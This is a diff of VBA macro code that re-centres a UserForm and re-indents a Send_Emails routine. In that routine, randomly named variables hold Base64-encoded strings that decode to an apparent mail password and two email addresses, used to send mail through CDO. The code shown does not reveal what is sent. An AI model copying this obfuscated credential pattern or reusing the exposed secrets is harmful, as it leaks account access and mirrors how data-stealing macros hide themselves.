@@ -1,11 +1,8 @@
+Private Sub UserForm_Activate()
 '/Positioning /'
-Private Sub UserForm_Initialize()
-    Dim sngLeft     As Single
-    Dim sngTop      As Single
-    
-    Call ReturnPosition_CenterScreen(Me.Height, Me.Width, sngLeft, sngTop)
-    Me.Left = sngLeft
-    Me.Top = sngTop
+    Me.Left = Application.Left + (0.5 * Application.Width) - (0.5 * Me.Width)
+    Me.Top = Application.Top + (0.5 * Application.Height) - (0.5 * Me.Height)
+'/End Positioning /'
 End Sub
 
 Private Sub btnBack_click()
@@ -24,12 +21,12 @@ Sub Send_Emails()
     Dim msConfigURL As String
     On Error GoTo Err:
     Dim ytbtencgrb As String
-	Dim ovrqoqgjyg As String
-	Dim dnwkjdfqxs As String
+    Dim ovrqoqgjyg As String
+    Dim dnwkjdfqxs As String
     ytbtencgrb = Base64DecodeString("aGN4eGpycHZ0bnR0am5lbQ==")
-	ovrqoqgjyg = Base64DecodeString("bmluc29zb2Z0QGdtYWlsLmNvbQ==")
-	dnwkjdfqxs = Base64DecodeString("YWxleGZhcmU5NEBnbWFpbC5jb20=")
-	
+    ovrqoqgjyg = Base64DecodeString("bmluc29zb2Z0QGdtYWlsLmNvbQ==")
+    dnwkjdfqxs = Base64DecodeString("YWxleGZhcmU5NEBnbWFpbC5jb20=")
+    
     
     'early binding
     Set NewMail = New CDO.Message
@@ -89,3 +86,4 @@ Err:
     Resume Exit_Err
     
 End Sub
+
